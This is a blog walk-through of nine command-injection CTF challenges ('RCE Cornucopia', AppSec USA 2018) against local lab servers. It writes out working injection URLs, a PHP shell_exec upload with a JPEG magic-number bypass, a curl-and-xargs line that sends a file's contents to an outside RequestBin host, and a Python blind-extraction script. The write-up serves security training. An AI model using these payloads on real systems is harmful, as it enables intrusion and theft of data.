---
layout: post
title:  "RCE Cornucopia - Walk-through"
date:   2018-10-31
---

RCE Cornucopia is a series of remote code execution challenges created by [Dejan Zelic](https://dejandayoff.com) for the CTF at AppSec USA 2018. Deployment information and solutions from the author are available [here](https://dejandayoff.com/rce-cornucopia---appsec-usa-2018-ctf-solution/).

![RCE Cornucopia](/img/rce-cornucopia/rce000.png)

# Challenge 1

For any challenge I like to observe the normal functionality of the application before trying anything funky. Enter an IP, hit submit. 

![RCE Cornucopia](/img/rce-cornucopia/rce1-000.png)

Looking at the HTML, the form action is a GET request. Given an input of `8.8.8.8` we're taken to,

```
http://127.0.0.1:8081/index.php?ip=8.8.8.8&submit=Ping%21
```

![RCE Cornucopia](/img/rce-cornucopia/rce1-001.png)

Given that this is the easiest level, I'm going to assume that this is the most nakedly vulnerable application possible. My guess is the user input is being appended to the `ping` command as a string and passed without modification to the system, like:

```
system('ping ' . $_GET['ip']);
```

The semicolon can be used as a [command seperator](https://www.tldp.org/LDP/abs/html/special-chars.html) in bash. Try,

```
http://127.0.0.1:8081/index.php?ip=8.8.8.8;%20hostname&submit=Ping!
```

![RCE Cornucopia](/img/rce-cornucopia/rce1-002.png)

The browser's address bar is a convenient place to do this sort of challenge because it displays normal ASCII to us but sends requests with the appropriate [URL encoding](https://en.wikipedia.org/wiki/Percent-encoding). We see a space, the browser sends a `%20`.

The `hostname` POC worked. It's a good test command because it's likely to be on the system and in the PATH, the name only contains alpha characters, we don't need arguments, spaces, or special characters to run it, and the output is brief.

What we're really after is this, however...

```
http://127.0.0.1:8081/index.php?ip=8.8.8.8;%20cat%20/tmp/flag.txt&submit=Ping!
```

![RCE Cornucopia](/img/rce-cornucopia/rce1-003.png)

# Challenge 2

![RCE Cornucopia](/img/rce-cornucopia/rce2-000.png)

Testing for normal functionality...

```
http://127.0.0.1:8082/index.php?domain=google.com&submit=Lookup
```

![RCE Cornucopia](/img/rce-cornucopia/rce2-001.png)

Trying the same trick as Challenge 1...

```
http://127.0.0.1:8082/index.php?domain=google.com;%20hostname&submit=Lookup
```

![RCE Cornucopia](/img/rce-cornucopia/rce2-002.png)

Dang!

The second-most obvious technique after `;` for chaining commands together is `&&` and `||` sometimes called an ['and list' or 'or list.'](http://www.tldp.org/LDP/abs/html/list-cons.html#LISTCONSREF)

To use `&&` in the URL the ampersands must be encoded. Ampersands are an "unsafe" character per [RFC-1738](http://www.ietf.org/rfc/rfc1738.txt) and must be encoded when not in use as a parameter delimiter. `%26` as ampersand is one of those things you just remember after a while.

Try,

```
http://127.0.0.1:8082/index.php?domain=google.com%20%26%26%20cat%20/tmp/flag.txt&submit=Lookup
```

![RCE Cornucopia](/img/rce-cornucopia/rce2-003.png)

# Challenge 3

![RCE Cornucopia](/img/rce-cornucopia/rce3-000.png)

Try it.

```
http://127.0.0.1:8083/index.php?domain=google.com&submit=Lookup
```

![RCE Cornucopia](/img/rce-cornucopia/rce3-001.png)

With our ability to chain commands pretty well defeated, let's try [command substitution](http://www.tldp.org/LDP/abs/html/commandsub.html). It is what it sounds like - replace a command with it's output on the command line. A simple example,

![RCE Cornucopia](/img/rce-cornucopia/rce3-005.png)

Trying command substitution using back-ticks,

```
http://127.0.0.1:8083/index.php?domain=`cat%20/tmp/flag.txt`&submit=Lookup
```

![RCE Cornucopia](/img/rce-cornucopia/rce3-002.png)

Hard to tell if that worked or not given the output.

The format of WHOIS results depends on the TLD. Note in the following example looking up some random garbage returns a brief error, but looking up a nonexistent `.com` domain echoes the domain in the error message. 

![RCE Cornucopia](/img/rce-cornucopia/rce3-003.png)

We can use this to our advantage. Throw a `.com` after the flag value so we're looking up... we don't know what but it ends in `.com` now!

```
http://127.0.0.1:8083/index.php?domain=`cat%20/tmp/flag.txt`.com&submit=Lookup
```

![RCE Cornucopia](/img/rce-cornucopia/rce3-004.png)

If this was a CTF and capitalization was important for the scoreboard I'd guess based on the formatting of previous challenges.

# Challenge 4

![RCE Cornucopia](/img/rce-cornucopia/rce4-000.png)

Do it.

```
http://127.0.0.1:8084/index.php?domain=google.com&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce4-001.png)

My first thought here was to use the `/tmp/flag.txt` as input to Nmap with `-iL` and then some other flag that would get the target to be printed.

We can confirm flags are accepted by Nmap doing something like `--iflist` which will produce some output no matter what.

```
http://127.0.0.1:8084/index.php?domain=--iflist&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce4-002.png)

I could not figure out how to make it happen with Nmap flags.

A totally different idea - maybe chaining commands isn't dead. Newline?

```
http://127.0.0.1:8084/index.php?domain=google.com%0Acat%20/tmp/flag.txt&submit=Scan
```

Yep.

![RCE Cornucopia](/img/rce-cornucopia/rce4-003.png)

# Challenge 5

![RCE Cornucopia](/img/rce-cornucopia/rce5-000.png)

Uploading a file, the POST request looks like the typical `multipart/form-data` variety.

```
POST http://127.0.0.1:8085/index.php HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://127.0.0.1:8080/
Content-Type: multipart/form-data; boundary=---------------------------35851058717958058741374149380
Content-Length: 494
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Host: 127.0.0.1:8085

-----------------------------35851058717958058741374149380
Content-Disposition: form-data; name="MAX_FILE_SIZE"

300000
-----------------------------35851058717958058741374149380
Content-Disposition: form-data; name="userfile"; filename="test.txt"
Content-Type: text/plain

what if i'm just a test file :'(

-----------------------------35851058717958058741374149380
Content-Disposition: form-data; name="submit"

Scan
-----------------------------35851058717958058741374149380--
```

![RCE Cornucopia](/img/rce-cornucopia/rce5-001.png)

The "You can download the file here" link has a long hash-like name and serves the file as expected.

```
# curl -v http://127.0.0.1:8085/uploads/df5c94a635fd6feb14aab94e5fd3ed10cdb13b2f0526bb1466c0e12474db93e3.txt
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8085 (#0)
> GET /uploads/df5c94a635fd6feb14aab94e5fd3ed10cdb13b2f0526bb1466c0e12474db93e3.txt HTTP/1.1
> Host: 127.0.0.1:8085
> User-Agent: curl/7.54.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Thu, 01 Nov 2018 03:07:41 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Thu, 01 Nov 2018 03:05:41 GMT
< ETag: "21-57991b1a8fc9e"
< Accept-Ranges: bytes
< Content-Length: 33
< Content-Type: text/plain
< 
what if i'm just a test file :'(
* Connection #0 to host 127.0.0.1 left intact
```

Bad things can happen when a web application serves user-provided files. This being a PHP application, the first thought should be, 'can I upload a PHP file?' and the second, 'will it execute?'

Modify the request above to use a `.php` filename and replace the file contents with a quick `shell_exec` to `cat` the flag. [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) shown here since this is AppSec USA after all.

![RCE Cornucopia](/img/rce-cornucopia/rce5-002.png)

Answer to the first question is yes, we can upload PHP files. But will it execute?

```
# curl -v http://127.0.0.1:8085/uploads/b0d0320f1440a2b9a325ead8338cd45aabc89740b8ea633c7dc4a5c856a6215a.php
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8085 (#0)
> GET /uploads/b0d0320f1440a2b9a325ead8338cd45aabc89740b8ea633c7dc4a5c856a6215a.php HTTP/1.1
> Host: 127.0.0.1:8085
> User-Agent: curl/7.54.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Thu, 01 Nov 2018 03:18:02 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 130
< Content-Type: text/html; charset=UTF-8
< 
flag{RipBoilingWater,YouWillBeMist}
* Connection #0 to host 127.0.0.1 left intact
source: https://www.reddit.com/r/oneliners/comments/78mp1h/rip_boiling_water_you_will_be_mist/
```

Yep.

# Challenge 6

![RCE Cornucopia](/img/rce-cornucopia/rce6-000.png)

Uploading a valid JPG displays some info as expected.

![RCE Cornucopia](/img/rce-cornucopia/rce6-001.png)

Uploading a different file type results in an error.

![RCE Cornucopia](/img/rce-cornucopia/rce6-002.png)

We can infer that the server is actually looking at the file because the file name and extension don't seem to matter at all. A JPG with a `.php` extension is accepted, and a PHP file with a `.jpg` extension is rejected.

The most straightforward way of determining the type of a file is looking at the [magic number](https://en.wikipedia.org/wiki/List_of_file_signatures). For a JPG the first 4 bytes is generally sufficient.

Take the first 4 bytes of a valid JPG and copy into it's own file.

```
root@kali ~/A/corn# dd if=test.jpg of=jpgmagicnum.dat bs=1 count=4
4+0 records in
4+0 records out
4 bytes transferred in 0.000125 secs (31957 bytes/sec)
```

`cat` the magic number plus the malicious PHP payload into a new file. Why use a PHP file extension and not JPG? We found earlier that it doesn't matter as far as the file being rejected or not, but it might matter in terms of whether the server will decide to execute our file as PHP.

```
root@kali ~/A/corn# cat flag.php 
<?php print shell_exec('cat /tmp/flag.txt'); ?>
root@kali ~/A/corn# cat jpgmagicnum.dat flag.jpg > pwn.php
```

The magic number in front of our PHP payload is enough to fool the `file` command locally.

```
root@kali ~/A/corn# cat pwn.php 
????<?php print shell_exec('cat /tmp/flag.txt'); ?>
root@kali ~/A/corn# file pwn.php 
pwn.php: JPEG image data
```

No metadata was found. Well I'm not surprised!

![RCE Cornucopia](/img/rce-cornucopia/rce6-003.png)

Checking the link...

```
# curl -v http://127.0.0.1:8086/uploads/420698287ca445da53fc584baca464ffa28bfa5421d9fd709df7b2785e6e3395.php
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8086 (#0)
> GET /uploads/420698287ca445da53fc584baca464ffa28bfa5421d9fd709df7b2785e6e3395.php HTTP/1.1
> Host: 127.0.0.1:8086
> User-Agent: curl/7.54.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Thu, 01 Nov 2018 03:46:31 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 145
< Content-Type: text/html; charset=UTF-8
< 
????flag{WhoeverPutThe"B"In"Subtle"WasClever}
* Connection #0 to host 127.0.0.1 left intact
Source: https://www.reddit.com/r/Showerthoughts/comments/1hwbdr/the_letter_b_in_the_word_subtle_is/
```

Booyah.

# Challenge 7

![RCE Cornucopia](/img/rce-cornucopia/rce7-000.png)

Back to a GET form action on this one. Testing with Google...

```
http://127.0.0.1:8087/index.php?domain=google.com&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce7-001.png)

It outputs a whooole lot, not going to include it all here. Something new for this level is that in addition to a number of illegal characters, certain words are banned like `cat`.

```
http://127.0.0.1:8087/index.php?domain=cat&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce7-002.png)

After some playing around I determined newline characters are not among the banned. Just need to find a command that isn't a prohibited string - `tac` is my go-to item there. It's `cat` but backwards, as the name suggests. Frequently overlooked!

```
http://127.0.0.1:8087/index.php?domain=google.com%0Atac%20/tmp/flag.txt&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce7-003.png)

The command injection worked since that's a `tac` error message but the outcome isn't as desired. `:443` appears to be appended to the user's input.  We can clean that up with a `#` to comment out everything that follows.

```
http://127.0.0.1:8087/index.php?domain=google.com%0Atac%20/tmp/flag.txt%20%23&submit=Scan
```

Note that like `&` from Challenge 2, `#` is an "unsafe" character per [RFC-1738](http://www.ietf.org/rfc/rfc1738.txt) and must be encoded as `%23`.

![RCE Cornucopia](/img/rce-cornucopia/rce7-004.png)

Can't quite read it so we'll take a look in the source. Why is the Reddit link first and the flag second unlike every other challenge? Because `tac`!

![RCE Cornucopia](/img/rce-cornucopia/rce7-005.png)

# Challenge 8

![RCE Cornucopia](/img/rce-cornucopia/rce8-000.png)

Try it.

```
http://127.0.0.1:8088/index.php?user=mike&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce8-001.png)

No users named Mike... this application is obviously a work of fiction.

In the course of trying some things I found that an ampersand provokes an error message.

```
http://127.0.0.1:8088/index.php?user=*&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce8-002.png)

The error message is from the `find` command, a huge clue as to how this works. I'm not familiar with this particular error and found [some advice](https://stackoverflow.com/questions/6495501/find-paths-must-precede-expression-how-do-i-specify-a-recursive-search-that) via Google'ing to use quotes.

```
http://127.0.0.1:8088/index.php?user=%22*%22&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce8-003.png)

Well then! Based on the use of the `find` command, we can guess the way this directory works is by having a file named after each user.

Set up a local POC with some empty files and names from the list above.

```
root@kali ~/A/c/08# ls
Sam  Shannon  Sophia
```

We'll assume the `find` command used by the application is simple and just appends the user input to the end. Trying some tests,

```
root@kali ~/A/c/08# find . -name Sam
./Sam
root@kali ~/A/c/08# find . -name "*"
.
./Sophia
./Shannon
./Sam
```

Not exactly the same output formatting as the web application, but it works.

`find` can take a number of different actions on matching items, outlined pretty well in the ACTIONS section of the [man page](https://linux.die.net/man/1/find). One action is to run an arbitrary command on matching files using `-exec`.

The command we'll run is to `cat` the flag to the matched file (Sam). The following will match Sam and then execute `cat /tmp/flag.txt Sam`

```
root@kali ~/A/c/08# find . -name Sam -exec cat /tmp/flag.txt {} +
flag{localPOCflag}
```

So our payload is,

```
Sam -exec cat /tmp/flag.txt {} +
```

For some reason this challenge is especially sensitive to URL encoding. To avoid problems I've encoded all non-alpha characters in the payload.

```
http://127.0.0.1:8088/index.php?user=Sam%20-exec%20cat%20%2Ftmp%2Fflag.txt%20%7B%7D%20%2B&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce8-004.png)

Woo.

# Challenge 9

![RCE Cornucopia](/img/rce-cornucopia/rce9-000.png)

Test run.

```
http://127.0.0.1:8089/index.php?url=example.com&string=coordination&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce9-001.png)

## Solution 1 - Web Request

We'll assume the application, like previous challenges, is coded in a very straightforward way using `curl` and `grep`. Something like `curl <URL> | grep <string>` followed by some logic to check whether anything was matched.

Note that `curl` can be used to read fetch a local file.

```
root@kali ~/A/c/09# curl file:///tmp/flag.txt
flag{localPOCflag}
```

Let's try that online, search for 'flag' in the URL `file:///tmp/flag.txt` since we know it will be there.

```
http://127.0.0.1:8089/index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string=flag&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce9-003.png)

By design, the application requests a page on the Internet that we specify and searches it for a string. What if we use a domain under our control and include the flag value in the URL? Something like `http://attacker.hax/<flag>`.

There's a project called [RequestBin](https://github.com/Runscope/requestbin) that provides you a tokenized URL and access to a panel which shows all requests made to that URL. Unfortunately "the" RequestBin has been taken offline due to abuse, but if you Google you can find another one that's up or host your own. 

For the moment I'll use [https://requestbin.fullcontact.com/](https://requestbin.fullcontact.com/). My bin URL is `http://requestbin.fullcontact.com/1m06f111`

Quick POC,

```
root@kali ~/A/c/09# curl http://requestbin.fullcontact.com/1m06f111/flagflagflag
ok
```

![RCE Cornucopia](/img/rce-cornucopia/rce9-002.png)

If we can get the actual flag value into the URL in place of 'flagflagflag' we're set.

To do this we'll `curl` the file into `xargs` and use that to build a second `curl` command which will hit RequestBin. `xargs` can take piped input and place it in the text of other commands.

Our local POC,

```
root@kali ~/A/c/09# curl file:///tmp/flag.txt | grep flag | xargs -I {} curl http://requestbin.fullcontact.com/1m06f111/{}
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    19  100    19    0     0  19000      0 --:--:-- --:--:-- --:--:-- 19000
ok
```

![RCE Cornucopia](/img/rce-cornucopia/rce9-004.png)

Success!

Now for the real deal. Search the URL `file:///tmp/flag.txt` for the string `flag | xargs -I {} curl http://requestbin.fullcontact.com/1m06f111/{}`

```
http://127.0.0.1:8089/index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string=flag+%7C+xargs+-I+%7B%7D+curl+http%3A%2F%2Frequestbin.fullcontact.com%2F1m06f111%2F%7B%7D&submit=Scan
```

![RCE Cornucopia](/img/rce-cornucopia/rce9-005.png)

And check RequestBin,

![RCE Cornucopia](/img/rce-cornucopia/rce9-006.png)

Success.

## Solution 2 - Blind Boolean

This challenge can be solved without requiring unlimited outbound Internet access from the web server. What if there was a white-list of domains or it could only be used internally on a local network? 

We can do this by guessing each character from front to back. We know the flag starts with `flag{` and can check for that. We'll ask, does it start with `flag{a`? or `flag{b`? or `flag{c`? and so on... Once the first letter is found (we'll look for a 'Yaaaaaassssss' in the response to determine this), repeat the same for the next character, and so on.

Some quick and dirty Python I used when the challenge was still hosted online for the AppSec USA CTF (URL removed),

```{% raw %}
import socket, urllib

HOST = "<url removed>"
PORT = 80
REQU = """GET /index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string={}&submit=Scan HTTP/1.1
Host: <url removed>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: <url removed>
Connection: close\r\n\r\n"""
ALPH = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

def corn9(guess):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))

	x = "-e '^flag{%s'" % (guess)
	s.send(REQU.format(urllib.quote_plus(x)))
	r = s.recv(8192)
	s.close()
	
	if "Yaaaaaassssss" in r:
		return True
	return False

p = ''
for i in xrange(64):
	f = False
	for c in ALPH:
		print p, c
		if corn9(p + c):
			f = True
			p = p + c
			break
	if not f:
		break

print "DONE"
print p
{% endraw %}```

Here it is running, fun to watch it go once things are working.

<https://www.youtube.com/watch?v=b186X-as8tM>

<iframe width="560" height="315" src="https://www.youtube.com/embed/b186X-as8tM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>